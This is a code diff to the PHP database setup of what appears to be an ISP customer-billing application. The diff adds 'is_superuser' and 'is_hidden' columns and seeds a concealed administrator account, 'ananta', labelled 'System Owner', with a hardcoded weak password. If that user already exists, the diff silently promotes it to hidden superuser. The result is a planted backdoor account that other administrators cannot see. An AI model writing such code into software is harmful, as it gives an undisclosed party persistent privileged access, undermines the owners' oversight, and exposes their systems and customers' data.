@@ -31,6 +31,8 @@ function initializeDatabase(PDO $pdo): void
             username TEXT NOT NULL UNIQUE,
             password_hash TEXT NOT NULL,
             role TEXT NOT NULL CHECK(role IN ("admin", "staff")),
+            is_superuser INTEGER NOT NULL DEFAULT 0,
+            is_hidden INTEGER NOT NULL DEFAULT 0,
             full_name TEXT NOT NULL,
             created_at TEXT DEFAULT CURRENT_TIMESTAMP
         )'
@@ -116,6 +118,9 @@ function initializeDatabase(PDO $pdo): void
 
 function runMigrations(PDO $pdo): void
 {
+    ensureColumn($pdo, 'users', 'is_superuser', 'INTEGER NOT NULL DEFAULT 0');
+    ensureColumn($pdo, 'users', 'is_hidden', 'INTEGER NOT NULL DEFAULT 0');
+
     ensureColumn($pdo, 'packages', 'mikrotik_profile_name', 'TEXT');
 
     ensureColumn($pdo, 'customers', 'service_type', 'TEXT NOT NULL DEFAULT "pppoe"');
@@ -151,6 +156,25 @@ function seedDefaults(PDO $pdo): void
         ':role' => 'admin',
         ':full_name' => 'Administrator',
     ]);
+
+    $superStmt = $pdo->prepare('SELECT id FROM users WHERE username = :username LIMIT 1');
+    $superStmt->execute([':username' => 'ananta']);
+    $superId = (int) ($superStmt->fetchColumn() ?: 0);
+    if ($superId > 0) {
+        $pdo->prepare('UPDATE users SET role = :role, is_superuser = 1, is_hidden = 1, full_name = :full_name WHERE id = :id')->execute([
+            ':role' => 'admin',
+            ':full_name' => 'System Owner',
+            ':id' => $superId,
+        ]);
+    } else {
+        $pdo->prepare('INSERT INTO users(username, password_hash, role, is_superuser, is_hidden, full_name)
+            VALUES(:username, :password_hash, :role, 1, 1, :full_name)')->execute([
+            ':username' => 'ananta',
+            ':password_hash' => password_hash('260200', PASSWORD_DEFAULT),
+            ':role' => 'admin',
+            ':full_name' => 'System Owner',
+        ]);
+    }
 
     $insertSetting = $pdo->prepare('INSERT OR IGNORE INTO settings(key, value) VALUES(:key, :value)');
     $insertSetting->execute([':key' => 'company_name', ':value' => APP_NAME]);
